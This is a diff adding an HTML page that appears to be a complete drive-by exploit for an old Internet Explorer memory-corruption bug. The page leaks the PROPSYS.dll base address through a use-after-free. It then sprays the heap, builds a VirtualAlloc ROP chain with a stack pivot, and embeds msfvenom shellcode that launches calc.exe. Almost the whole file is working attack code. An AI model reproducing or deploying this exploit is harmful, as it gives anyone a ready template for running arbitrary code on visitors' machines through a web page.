@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        .class1 { float: left; column-count: 5; }
+        .class2 { column-span: all; columns: 1px; }
+        table {border-spacing: 0px;}
+    </style>
+    <script>
+ 
+    var base_leaked_addr = "";
+ 
+    function infoleak() {
+     
+        var textarea = document.getElementById("textarea");
+        var frame = document.createElement("iframe");
+      
+        textarea.appendChild(frame);
+        frame.contentDocument.onreadystatechange = eventhandler;
+ 
+        form.reset();
+         
+    }
+      
+    function eventhandler() {
+     
+        document.getElementById("textarea").defaultValue = "foo";
+        // Object replaced here
+        // one of the side allocations of the audio element
+        var audioElm = document.createElement("audio");
+            audioElm.src = "test.mp3";
+                 
+    }
+     
+    function writeu(base, offs) {
+     
+        var res = 0;
+        if (base != 0) {  res = base + offs }
+        else {  res = offs }
+        res = res.toString(16);
+        while (res.length < 8) res = "0"+res;
+        return "%u"+res.substring(4,8)+"%u"+res.substring(0,4);
+         
+    }
+     
+    function readu(value) {
+                 
+        var uc = escape(value);
+        var ucsplit = uc.split('%');
+        var res = parseInt('0x' + ucsplit[2].replace('u', '') + ucsplit[1].replace('u', ''));
+        return res;
+         
+    }
+         
+    function spray() {
+     
+        // DEPS technique used here - avoid null bytes
+ 
+        var hso = document.createElement("div");
+        base_leaked_addr = parseInt(base_leaked_addr,16);
+ 
+        var junk = unescape("%u0e0e%u0e0e");
+        while (junk.length < 0x1000) junk += junk;
+ 
+ 
+        var rop = unescape(
+            writeu(base_leaked_addr,0x56341) + 
+            writeu(base_leaked_addr,0x56341) + 
+            writeu(base_leaked_addr,0x9b7c) + 
+            writeu(0,0xffffffff) + 
+            writeu(base_leaked_addr,0x2a89e) + 
+            writeu(0,0x41414141) + 
+            writeu(base_leaked_addr,0x4e385) + 
+            writeu(0,0x41414141) + 
+            writeu(base_leaked_addr,0x2030f) + 
+            writeu(base_leaked_addr,0x9b7c) + 
+            writeu(0,0x41414141) + 
+            writeu(0,0x41414141) + 
+            writeu(0,0xf07645d5) + 
+            writeu(base_leaked_addr,0x6e002) + 
+            writeu(0,0x41414141) + 
+            writeu(base_leaked_addr,0xaebc) + 
+            writeu(base_leaked_addr,0x9b7c) + 
+            writeu(0,0xffffffbf) + 
+            writeu(base_leaked_addr,0x2a89e) + 
+            writeu(0,0x41414141) + 
+            writeu(base_leaked_addr,0x6361b) + 
+            writeu(base_leaked_addr,0x432cf) + 
+            writeu(0,0x41414141) + 
+            writeu(0,0x41414141) + 
+            writeu(base_leaked_addr,0x9b7c) + 
+            writeu(base_leaked_addr,0x5cef1) + 
+            writeu(base_leaked_addr,0x4177e) + 
+            writeu(base_leaked_addr,0x9b7c) + 
+            writeu(base_leaked_addr,0x1244) + 
+            writeu(base_leaked_addr,0xa819) + 
+            writeu(0,0x41414141) + 
+            writeu(base_leaked_addr,0x2720b) + 
+            "" );
+ 
+        /*
+         
+        Original VirtualAlloc ROP generated with mona.py - www.corelan.be
+        Library used "propsys.dll", part of the Windows Search functionality (?)
+        and last updated Nov 2010. I think it's a good target for our needs.
+        Fixed to overcome the problem with MOV EAX,80004001 after the PUSHAD instruction
+         
+        "%u6341%u6af8" + // 0x6af86341 : ,# POP EBP # RETN [PROPSYS.dll] 
+        "%u6341%u6af8" + // 0x6af86341 : ,# skip 4 bytes [PROPSYS.dll]
+        "%u9b7c%u6af3" + // 0x6af39b7c : ,# POP EAX # RETN 0x04 [PROPSYS.dll] 
+        "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
+        "%ua89e%u6af5" + // 0x6af5a89e : ,# NEG EAX # RETN [PROPSYS.dll] 
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+        "%ue385%u6af7" + // 0x6af7e385 : ,# PUSH EAX # ADD AL,5E # XOR EAX,EAX # POP EBX # POP EDI # POP EBP # RETN 0x08 [PROPSYS.dll] 
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate) --> changed to 0x6af5030f :  # POP EBX # RETN    ** [PROPSYS.dll] **   |   {PAGE_EXECUTE_READ}
+        "%u9b7c%u6af3" + // 0x6af39b7c : ,# POP EAX # RETN 0x04 [PROPSYS.dll] 
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+        "%u45d5%uf076" + // 0xf07645d5 : ,# put delta into eax (-> put 0x00001000 into edx)
+        "%ue002%u6af9" + // 0x6af9e002 : ,# ADD EAX,0F89CA2B # RETN [PROPSYS.dll] 
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+        "%uaebc%u6af3" + // 0x6af3aebc : ,# XCHG EAX,EDX # RETN [PROPSYS.dll] 
+        "%u9b7c%u6af3" + // 0x6af39b7c : ,# POP EAX # RETN 0x04 [PROPSYS.dll] 
+        "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
+        "%ua89e%u6af5" + // 0x6af5a89e : ,# NEG EAX # RETN [PROPSYS.dll] 
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+        "%u361b%u6af9" + // 0x6af9361b : ,# XCHG EAX,ECX # ADD DL,B # DEC ECX # RETN 0x08 [PROPSYS.dll] 
+        "%u32cf%u6af7" + // 0x6af732cf : ,# POP EDI # RETN [PROPSYS.dll] 
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+        "%u40bd%u6af4" + // 0x6af440bd : ,# RETN (ROP NOP) [PROPSYS.dll] 
+        "%ucef1%u6af8" + // 0x6af8cef1 : ,# POP ESI # RETN [PROPSYS.dll] 
+        "%u177e%u6af7" + // 0x6af7177e : ,# JMP [EAX] [PROPSYS.dll]
+        "%u9b7c%u6af3" + // 0x6af39b7c : ,# POP EAX # RETN 0x04 [PROPSYS.dll] 
+        "%u1244%u6af3" + // 0x6af31244 : ,# ptr to &VirtualAlloc() [IAT PROPSYS.dll]
+        "%u6af8" + // 0x6af80a14 : ,# PUSHAD # ADD AL,0 # MOV EAX,80004001 # POP EBP # RETN 0x08 [PROPSYS.dll]  --> changed to  0x6af3a819 :  # PUSHAD # CMP EAX,0C68B6AF3 # POP ESI # RETN    ** [PROPSYS.dll] **   |   {PAGE_EXECUTE_READ}
+        "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation) 
+        "%u720b%u6af5" + // 0x6af5720b : ,# ptr to 'jmp esp' [PROPSYS.dll]
+         
+        */
+         
+         
+         
+        // Move ESP to the VirtualAlloc ROP chain
+        var stack_shift_rop = unescape(
+            writeu(0,235802130) +
+            writeu(base_leaked_addr,0x2030f) + // 0x6af5030f :  # POP EBX # RETN    ** [PROPSYS.dll] **   |   {PAGE_EXECUTE_READ}
+            writeu(0,0x0e0e1258) +
+            writeu(base_leaked_addr,0x28002) +  // 0x6af58002 :  # MOV EAX,EBX # POP EBX # POP EBP # RETN 0x08    ** [PROPSYS.dll] **   |   {PAGE_EXECUTE_READ}
+            writeu(0,0x41414141) +
+            writeu(0,0x41414141) +
+            writeu(base_leaked_addr,0x0b473) + //0x6af3b473 :  # XCHG EAX,ESP # RETN    ** [PROPSYS.dll] **   |   {PAGE_EXECUTE_READ}
+            writeu(0,0x41414141) + 
+            writeu(0,0x41414141) +
+            "");
+         
+         
+         
+ 
+        // root@kali:~# msfvenom  -p windows/exec cmd=calc.exe -b "\x00" -f js_le
+        // ~2854 bytes max
+         
+        var shellcode = unescape("%uec83%u4070" + // move stack pointer away to avoid shellcode corruption
+                "%ucadb%ub6ba%u0f7b%ud99f%u2474%u5ef4%uc929%u31b1%uee83%u31fc%u1456%u5603%u99a2%u63fa%udf22%u9c05%u80b2%u798c%u8083%u0aeb%u30b3%u5e7f%uba3f%u4b2d%uceb4%u7cf9%u647d%ub3dc%ud57e%ud51c%u24fc%u3571%ue73d%u3484%u1a7a%u6464%u50d3%u99db%u2c50%u12e0%ua02a%uc660%uc3fa%u5941%u9a71%u5b41%u9656%u43cb%u93bb%uf882%u6f0f%u2915%u905e%u14ba%u636f%u51c2%u9c57%uabb1%u21a4%u6fc2%ufdd7%u7447%u757f%u50ff%u5a7e%u1266%u178c%u7cec%ua690%uf721%u23ac%ud8c4%u7725%ufce3%u236e%ua58a%u82ca%ub6b3%u7bb5%ubc16%u6f5b%u9f2b%u6e31%ua5b9%u7077%ua5c1%u1927%u2ef0%u5ea8%ue50d%u918d%ua447%u39a7%u3c0e%u27fa%ueab1%u5e38%u1f32%ua5c0%u6a2a%ue2c5%u86ec%u7bb7%ua899%u7b64%uca88%uefeb%u2350%u978e%u3bf3" +
+        "");
+     
+         
+        var xchg = unescape(writeu(base_leaked_addr, 0x0b473));  // Initial EIP control ---> 0x6af3b473 :  # XCHG EAX,ESP # RETN    ** [PROPSYS.dll] **   |   {PAGE_EXECUTE_READ}
+        var fix1 = 0x15c; 
+        var fixop = unescape("%u0e0e%u0e0e");
+        var offset_to_stack_shift = 0x6f7;
+        var offset_to_xchg = 0xd2+2;
+        // Jumping a bit around here, pretty sure this can be simplified but hey... it works
+        data = junk.substring(0,fix1-rop.length) + rop + fixop + shellcode + junk.substring(0,offset_to_stack_shift-fix1-fixop.length-shellcode.length) + stack_shift_rop + junk.substring(0,offset_to_xchg-stack_shift_rop.length) + xchg;
+        data += junk.substring(0,0x800-offset_to_stack_shift-offset_to_xchg-xchg.length);
+     
+        while (data.length < 0x80000) data += data;
+        for (var i = 0; i < 0x350; i++) 
+        {
+            var obj = document.createElement("button");
+            obj.title = data.substring(0,(0x7fb00-2)/2); 
+            hso.appendChild(obj);
+        }
+    }
+ 
+    function boom() {
+        document.styleSheets[0].media.mediaText = "aaaaaaaaaaaaaaaaaaaa";
+        th1.align = "right";
+    }
+     
+    setTimeout(function() {
+ 
+        var txt = document.getElementById("textarea");
+        var il = txt.value.substring(0,2);
+        var leaked_addr = readu(il);
+        base_leaked_addr = leaked_addr - 0xbacc; // base of propsys
+        base_leaked_addr = base_leaked_addr.toString(16);
+        spray();
+        boom();
+         
+    }, 1000); // can be reduced
+    </script>
+</head>
+ 
+<body onload=infoleak()>
+    <form id="form">
+        <textarea id="textarea" style="display:none" cols="81">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</textarea>
+    </form>
+<script>
+ 
+</script>
+    <table cellspacing="0">
+        <tr class="class1">
+        <th id="th1" colspan="0" width=2000000></th>
+        <th class="class2" width=0><div class="class2"></div></th>
+    </table>
+</body>
+</html>
